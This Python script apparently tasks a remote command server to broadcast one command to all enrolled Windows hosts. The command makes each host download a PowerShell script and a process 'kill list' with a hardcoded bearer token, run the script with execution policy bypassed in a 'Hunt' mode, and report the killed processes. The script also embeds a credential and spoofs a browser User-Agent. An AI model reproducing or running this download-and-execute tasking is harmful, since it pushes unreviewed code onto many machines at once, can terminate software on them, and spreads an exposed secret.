#!/usr/bin/env python3
"""Re-queue C33 force Hunt with literal URLs (no custom %VAR% parse-time expand bug)."""
from __future__ import annotations

import sys
import urllib.parse
import urllib.request
from pathlib import Path

BASE = "https://debian.seczio.com"
ADMIN = ((Path(__file__).resolve().parent / "secrets" / "admin_token.txt")).read_text(encoding="utf-8").strip()

# No custom %VARS% on a one-line & chain — they expand empty before set runs.
FORCE_CMD = (
    'curl.exe -f -L --ssl-no-revoke -H "Authorization: Bearer fe7e8f3b8af479870248be10ca25410b8e1bf9a5"'
    " --connect-timeout 8 --max-time 30"
    r" -o C:\ProgramData\WinRTCS\killlist.cfg"
    " https://debian.seczio.com/winrtcs/winrtcs_killlist.cfg"
    ' & curl.exe -f -L --ssl-no-revoke -H "Authorization: Bearer fe7e8f3b8af479870248be10ca25410b8e1bf9a5"'
    " --connect-timeout 8 --max-time 30"
    r" -o C:\ProgramData\WinRTCS\winrtcs_sidekick.ps1"
    " https://debian.seczio.com/winrtcs/winrtcs_sidekick.ps1"
    " & powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass"
    r" -File C:\ProgramData\WinRTCS\winrtcs_sidekick.ps1 -Action Hunt"
    r" -WorkDir C:\ProgramData\WinRTCS -KillList C:\ProgramData\WinRTCS\killlist.cfg"
    r" & if exist C:\ProgramData\WinRTCS\killer.out (type C:\ProgramData\WinRTCS\killer.out)"
    " else (echo killer_out=none)"
    r' & findstr /I "BVTFilter WucacheWatchdog KernCap KeepTwo" C:\ProgramData\WinRTCS\killlist.cfg'
    " & echo C33_FORCE2_DONE"
)


def api(path: str, fields: dict | None = None) -> str:
    data = urllib.parse.urlencode(fields).encode() if fields is not None else None
    req = urllib.request.Request(BASE + path, data=data)
    req.add_header("Authorization", "Bearer " + ADMIN)
    req.add_header("User-Agent", "Mozilla/5.0 (WinRTCS-Console)")
    with urllib.request.urlopen(req, timeout=60) as r:
        return r.read().decode(errors="replace")


def main() -> int:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    print("len", len(FORCE_CMD))
    assert len(FORCE_CMD) < 4000
    print(api("/cmd", {"target": "ALL", "cmd": FORCE_CMD}))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
